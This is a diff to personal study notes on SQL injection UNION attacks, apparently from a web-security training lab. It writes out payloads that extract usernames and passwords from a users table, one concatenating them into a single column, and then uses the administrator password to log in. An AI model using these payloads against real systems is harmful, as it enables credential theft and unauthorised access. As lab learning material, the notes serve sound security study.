@@ -36,3 +36,18 @@ Find number of columns using NULL
 '+UNION+SELECT+NULL,NULL--  
 Check columns for string values  
 '+UNION+SELECT+'string','string2'--
+Replace strings to search for username and password on table users
+'+UNION+SELECT+username,+password+FROM+users--
+right click - show response in browser, open new tab, paste.
+get administrator password, and paste into login.
+
+### SQL injection UNION attack, retrieving multiple values in a single column
+
+intercept cateogry, move to repeater  
+in repeater find column size  
+'+UNION+SELECT+NULL,'string'--  
+locate string for username/password injection  
+concat username and password into string starr is used to seperate values so you can find easily  
+'+UNION+SELECT+NULL,username||'\*'||password+FROM+users--  
+right click response show response in browser  
+grab administrator password and login
